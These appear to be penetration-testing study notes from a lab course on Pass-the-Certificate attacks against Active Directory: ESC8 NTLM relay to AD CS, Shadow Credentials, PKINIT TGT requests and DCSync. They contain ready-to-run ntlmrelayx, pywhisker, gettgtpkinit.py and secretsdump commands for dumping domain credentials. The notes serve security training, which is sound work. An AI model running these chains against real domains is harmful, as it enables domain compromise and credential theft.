# Pass the Certificate

## Core Concept

PKINIT allows Kerberos initial authentication using public-key cryptography.

```text
Certificate + Private Key
          ↓
        PKINIT
          ↓
         KDC
          ↓
         TGT
```

Pass-the-Certificate therefore means using certificate-based credentials to obtain a Kerberos TGT.

---

# 1. Important Terms

```text
PKINIT
    Public Key Cryptography for Initial Authentication

AD CS
    Active Directory Certificate Services

X.509
    Certificate format/standard used for identity and public-key credentials

PFX / PKCS#12
    Container commonly holding certificate + private key

TGT
    Ticket Granting Ticket

EKU
    Extended Key Usage
```

---

# 2. Certificate vs Private Key

```text
Certificate
    ↓
public identity/key information

Private key
    ↓
proof of possession
```

For certificate-based authentication, the matching private key is normally required.

Common useful container:

```text
.pfx
```

which can contain:

```text
Certificate
Private key
Certificate chain
```

---

# 3. ESC8

ESC8 is an NTLM relay attack against AD CS Web Enrollment.

Concept:

```text
Victim
   ↓
NTLM authentication
   ↓
Attacker / relay
   ↓
AD CS HTTP enrollment
   ↓
Certificate issued
```

Typical web enrollment endpoint:

```text
/certsrv/
```

---

# 4. ntlmrelayx for ESC8

General structure:

```bash
impacket-ntlmrelayx \
    -t http://<CA>/certsrv/certfnsh.asp \
    --adcs \
    -smb2support \
    --template <TEMPLATE>
```

Example lab syntax:

```bash
impacket-ntlmrelayx \
    -t http://10.129.234.110/certsrv/certfnsh.asp \
    --adcs \
    -smb2support \
    --template KerberosAuthentication
```

Important:

```text
-t
    relay target

--adcs
    AD CS attack mode

--template
    certificate template
```

Template names are environment-specific.

Enumerate rather than assuming.

---

# 5. Authentication Coercion

Relay requires a victim to authenticate.

Concept:

```text
Coerce victim
      ↓
Victim sends NTLM authentication
      ↓
ntlmrelayx receives it
      ↓
relay to AD CS
```

The lab demonstrates a printer-spooler/RPRN coercion technique.

The important concept is:

```text
Coercion
   +
NTLM relay
   =
certificate enrollment
```

---

# 6. ESC8 Output

Interesting output:

```text
Authenticating as INLANEFREIGHT/DC01$ SUCCEED
Generating CSR
Getting certificate
GOT CERTIFICATE
Writing PKCS#12 certificate
```

Result:

```text
DC01$.pfx
```

Meaning:

```text
DC01$ identity
   ↓
certificate + private key
```

---

# 7. Certificate → TGT

Use PKINIT tooling:

```bash
python3 gettgtpkinit.py \
    -cert-pfx <CERTIFICATE.pfx> \
    -dc-ip <DC-IP> \
    '<DOMAIN>/<USER>' \
    <OUTPUT.ccache>
```

Example:

```bash
python3 gettgtpkinit.py \
    -cert-pfx '../DC01$.pfx' \
    -dc-ip 10.129.234.109 \
    'inlanefreight.local/dc01$' \
    /tmp/dc.ccache
```

Concept:

```text
PFX
 ↓
certificate + private key
 ↓
PKINIT
 ↓
TGT
 ↓
ccache
```

---

# 8. KRB5CCNAME

After obtaining:

```text
/tmp/dc.ccache
```

set:

```bash
export KRB5CCNAME=/tmp/dc.ccache
```

Verify:

```bash
klist
```

Expected:

```text
Default principal: dc01$@DOMAIN
Service principal:
krbtgt/DOMAIN@DOMAIN
```

---

# 9. Certificate → DCSync Chain

Lab example:

```text
DC01$ certificate
       ↓
PKINIT
       ↓
DC01$ TGT
       ↓
KRB5CCNAME
       ↓
Kerberos authentication
       ↓
DCSync
       ↓
domain credential material
```

Example:

```bash
impacket-secretsdump \
    -k \
    -no-pass \
    -dc-ip <DC-IP> \
    -just-dc-user Administrator \
    '<DOMAIN>/DC01$'@<DC-HOSTNAME>
```

Important:

```text
-k
    Kerberos

-no-pass
    don't request password
```

---

# 10. Shadow Credentials

Abuses the AD attribute:

```text
msDS-KeyCredentialLink
```

The attack requires permissions to modify the victim's attribute.

BloodHound edge:

```text
AddKeyCredentialLink
```

Concept:

```text
Attacker
   ↓
write access to msDS-KeyCredentialLink
   ↓
add attacker-controlled public key
   ↓
certificate/private key created
   ↓
PKINIT
   ↓
victim's TGT
```

---

# 11. pywhisker

General structure:

```bash
pywhisker \
    --dc-ip <DC-IP> \
    -d <DOMAIN> \
    -u <CURRENT_USER> \
    -p '<PASSWORD>' \
    --target <VICTIM> \
    --action add
```

Example:

```bash
pywhisker \
    --dc-ip 10.129.234.109 \
    -d INLANEFREIGHT.LOCAL \
    -u wwhite \
    -p '<PASSWORD>' \
    --target jpinkman \
    --action add
```

Concept:

```text
Find victim
      ↓
Generate certificate
      ↓
Generate KeyCredential
      ↓
Modify msDS-KeyCredentialLink
      ↓
Generate PFX
```

---

# 12. Shadow Credentials → TGT

Use the generated PFX:

```bash
python3 gettgtpkinit.py \
    -cert-pfx <PFX> \
    -pfx-pass '<PFX_PASSWORD>' \
    -dc-ip <DC-IP> \
    <DOMAIN>/<VICTIM> \
    /tmp/<victim>.ccache
```

Then:

```bash
export KRB5CCNAME=/tmp/<victim>.ccache
```

Verify:

```bash
klist
```

You should see:

```text
Default principal: victim@DOMAIN

krbtgt/DOMAIN@DOMAIN
```

---

# 13. Use the TGT

Once the TGT is available, you're back in normal Kerberos territory.

For example:

```bash
klist
```

then use Kerberos-aware tools such as:

```bash
impacket-wmiexec <host> -k -no-pass
```

or:

```bash
evil-winrm -i <host> -r <domain>
```

provided the account has the necessary authorization.

---

# 14. ESC8 vs Shadow Credentials

|                  | ESC8                              | Shadow Credentials            |
| ---------------- | --------------------------------- | ----------------------------- |
| Initial issue    | NTLM relay / AD CS web enrollment | Write permission on AD object |
| Target           | AD CS enrollment endpoint         | `msDS-KeyCredentialLink`      |
| Main tool        | `ntlmrelayx`                      | `pywhisker`                   |
| Result           | Certificate                       | Certificate/key credential    |
| Next step        | PKINIT                            | PKINIT                        |
| Final credential | TGT                               | TGT                           |

---

# 15. PKINIT Flow

```text
Certificate + private key
          ↓
       AS-REQ
          ↓
         KDC
          ↓
       PKINIT
          ↓
       AS-REP
          ↓
         TGT
```

Don't confuse:

```text
certificate
```

with:

```text
TGT
```

The certificate is the authentication material used to obtain the TGT.

---

# 16. No PKINIT

If the environment doesn't support the needed PKINIT authentication path:

```text
certificate
   ↓
PKINIT
   X
```

Certificate authentication may still be possible through:

```text
PassTheCert
    ↓
LDAPS
    ↓
certificate authentication
    ↓
AD operations
```

Possible operations depend on available privileges.

---

# 17. File Formats

```text
.pfx / .p12
    → certificate + private key container

.ccache
    → Linux Kerberos credential cache

.kirbi
    → Windows Kerberos ticket format
```

Useful conversion:

```bash
impacket-ticketConverter <input> <output>
```

---

# 18. Tool Recognition

```text
Certipy
    → AD CS enumeration/assessment

ntlmrelayx
    → NTLM relay / ESC8

pywhisker
    → Shadow Credentials

gettgtpkinit.py
    → certificate → Kerberos TGT

PassTheCert
    → certificate authentication through LDAPS
       when PKINIT is unsuitable

klist
    → inspect Kerberos tickets

secretsdump
    → retrieve credential material via supported methods
```

---

# 19. Full ESC8 Chain

```text
Victim / DC
    ↓
authentication coercion
    ↓
NTLM
    ↓
ntlmrelayx
    ↓
AD CS Web Enrollment
    ↓
certificate
    ↓
PFX
    ↓
gettgtpkinit.py
    ↓
TGT
    ↓
KRB5CCNAME
    ↓
Kerberos
    ↓
DCSync / authorized service access
```

---

# 20. Full Shadow Credentials Chain

```text
BloodHound
    ↓
AddKeyCredentialLink
    ↓
pywhisker
    ↓
modify msDS-KeyCredentialLink
    ↓
attacker-controlled certificate
    ↓
PFX
    ↓
gettgtpkinit.py
    ↓
victim TGT
    ↓
KRB5CCNAME
    ↓
Kerberos service access
```

---

# 21. Complete Credential Family

```text
NT hash
   ↓
PtH
   ↓
NTLM
```

```text
NT hash / Kerberos key
   ↓
OverPass-the-Hash
   ↓
TGT
```

```text
TGT / TGS
   ↓
PtT
   ↓
Kerberos
```

```text
Certificate + private key
   ↓
PKINIT
   ↓
TGT
   ↓
Kerberos
```

---

# Golden Rules

```text
1. PKINIT allows Kerberos initial authentication using public-key cryptography.

2. Pass-the-Certificate is fundamentally certificate-based authentication leading to a TGT.

3. A certificate alone is not generally enough; the corresponding private key is important.

4. PFX/PKCS#12 commonly contains the certificate and private key.

5. ESC8 abuses NTLM relay against AD CS Web Enrollment.

6. Coercion can cause a machine/user to authenticate to the relay listener.

7. The certificate template is environment-specific; enumerate it rather than assuming a name.

8. Shadow Credentials abuses write access to msDS-KeyCredentialLink.

9. BloodHound's AddKeyCredentialLink relationship can identify a Shadow Credentials attack path.

10. ESC8 and Shadow Credentials have different initial weaknesses but converge on PKINIT.

11. gettgtpkinit.py uses certificate-based authentication to obtain a Kerberos TGT.

12. After obtaining a TGT, the attack becomes a normal Kerberos/PtT workflow.

13. KRB5CCNAME tells Linux Kerberos-aware tools which credential cache to use.

14. A TGT is not the same thing as a certificate.

15. A certificate is not automatically a TGT.

16. If PKINIT is unavailable, certificate authentication through LDAPS may still provide an alternative path such as PassTheCert.

17. Authentication identity and authorization are still separate: obtaining a TGT as a user does not automatically grant every privilege.
```
